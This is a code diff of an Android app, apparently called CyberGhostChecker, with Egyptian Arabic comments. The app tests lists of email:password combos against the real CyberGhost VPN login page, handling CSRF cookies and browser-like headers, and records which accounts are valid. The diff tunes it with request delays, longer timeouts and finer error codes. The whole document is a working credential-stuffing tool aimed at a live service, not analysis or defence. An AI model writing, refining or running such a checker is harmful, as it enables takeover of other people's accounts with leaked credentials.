@@ -21,7 +21,6 @@ import java.io.File
 import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
-    // إدارة الكوكيز عشان نحاكي الـ Session في بايثون
     private val cookieStore = mutableMapOf<String, MutableList<Cookie>>()
     private val cookieJar = object : CookieJar {
         override fun saveFromResponse(url: HttpUrl, cookies: List<Cookie>) {
@@ -34,8 +33,8 @@ class MainActivity : AppCompatActivity() {
 
     private val client = OkHttpClient.Builder()
         .cookieJar(cookieJar)
-        .connectTimeout(20, TimeUnit.SECONDS)
-        .readTimeout(20, TimeUnit.SECONDS)
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
         .followRedirects(true)
         .build()
         
@@ -80,7 +79,9 @@ class MainActivity : AppCompatActivity() {
             var invalid = 0
             var err = 0
             for ((email, pwd) in combos) {
-                val (st, _) = checkOne(email, pwd)
+                // إضافة تأخير بسيط عشان منضغطش على السيرفر
+                delay(1000) 
+                val (st, detail) = checkOne(email, pwd)
                 results.add(Triple(email, pwd, st))
                 when (st) {
                     "valid" -> valid++
@@ -89,11 +90,10 @@ class MainActivity : AppCompatActivity() {
                 }
                 done++
                 status.text = "$done/$total   صح $valid   خطأ $invalid   أخطاء $err"
-                log.append("$email:$pwd -> $st\n")
+                log.append("$email:$pwd -> $st ($detail)\n")
                 (log.parent as? ScrollView)?.let { sv ->
                     sv.post { sv.fullScroll(ScrollView.FOCUS_DOWN) }
                 }
-                delay(500)
             }
             saveResults()
             Toast.makeText(this@MainActivity, "خلص — اتحفظ في Download/CyberGhostChecker", Toast.LENGTH_LONG).show()
@@ -103,22 +103,20 @@ class MainActivity : AppCompatActivity() {
     private suspend fun checkOne(email: String, pwd: String): Pair<String, String> =
         withContext(Dispatchers.IO) {
             try {
-                // 1. ننضف الكوكيز القديمة عشان كل حساب يبقى ليه جلسة مستقلة
                 cookieStore.clear()
 
-                // 2. جلب صفحة الدخول
                 val getReq = Request.Builder()
                     .url("https://my.cyberghostvpn.com/en_US/login")
                     .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                     .build()
                 
-                client.newCall(getReq).execute().close()
+                client.newCall(getReq).execute().use { r1 ->
+                    if (!r1.isSuccessful) return@withContext "error" to "get_${r1.code}"
+                }
 
-                // 3. استخراج الـ CSRF من الكوكيز المخزنة
                 val csrf = cookieStore["my.cyberghostvpn.com"]?.find { it.name == "csrfToken" }?.value ?: ""
-                if (csrf.isEmpty()) return@withContext "error" to "no_csrf"
+                if (csrf.isEmpty()) return@withContext "error" to "no_csrf_cookie"
 
-                // 4. إرسال البيانات
                 val formBody = FormBody.Builder()
                     .add("email", email)
                     .add("password", pwd)
@@ -135,7 +133,6 @@ class MainActivity : AppCompatActivity() {
 
                 client.newCall(postReq).execute().use { r ->
                     val body = r.body?.string()?.lowercase() ?: ""
-                    val newCookies = r.headers("Set-Cookie").toString().lowercase()
                     val sessionCookies = cookieStore["my.cyberghostvpn.com"]?.map { it.name }?.joinToString(",") ?: ""
                     
                     if (sessionCookies.contains("login_web_") || sessionCookies.contains("remember_web_") || body.contains("logout") || body.contains("sign out") || body.contains("dashboard")) {
@@ -143,11 +140,12 @@ class MainActivity : AppCompatActivity() {
                     } else if (body.contains("invalid") || body.contains("credentials") || body.contains("password")) {
                         "invalid" to "wrong_pass"
                     } else {
-                        "invalid" to "unknown"
+                        "invalid" to "unknown_resp_${r.code}"
                     }
                 }
             } catch (e: Exception) {
-                "error" to (e.message ?: "net")
+                // هنا بنطبع نوع الخطأ بالظبط
+                "error" to (e.javaClass.simpleName + ": " + (e.message ?: "net"))
             }
         }
 
